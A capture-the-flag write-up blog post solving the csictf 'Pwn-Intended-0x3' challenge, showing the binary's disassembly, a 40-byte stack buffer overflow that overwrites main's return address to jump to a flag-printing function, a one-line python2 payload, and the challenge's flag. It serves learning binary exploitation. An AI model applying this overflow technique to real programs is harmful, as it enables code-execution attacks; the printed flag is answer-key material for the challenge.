---
layout: post
title: "Pwn-Intended-0x3"
author: "AnandSaminathan"
tags: ['Pwn']
---

**Files**
- [pwn-intended-0x3]({{site.baseurl}}/assets/Pwn-Intended-0x3/pwn-intended-0x3)

## Solution

This is exactly same as [coffer-overflow-2](https://dunsp4rce.github.io/redpwn-2020/pwn/2020/06/26/coffer-overflow-2.html) from redpwn-2020. 
In this case the return address of main has to be replaced with the address of a function called `flag` (which prints the flag).

Disassembly of `flag` with the starting address:
```
   0x00000000004011ce: push   rbp
   	                   mov    rbp,rsp
   	                   lea    rdi,[rip+0xe5f]        
                       call   0x401030 <puts@plt>
   	                   lea    rdi,[rip+0xe7b]        
   	                   call   0x401050 <system@plt> # system("cat flag.txt")
   	                   mov    edi,0x0
   	                   call   0x401070 <exit@plt>
```

Using gdb, the distance between the starting address of the buffer and the return address of main in the stack was found to be 40 bytes (rbp + 8 bytes), so we can have some padding of 40 bytes and then have the address of `flag` function in little endian. This worked:

```shell
python2 -c "print 'A'*40 + '\xce\x11\x40\x00\x00\x00\x00\x00'" | ./pwn-intended-0x3
```

## Flag

```
csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
```




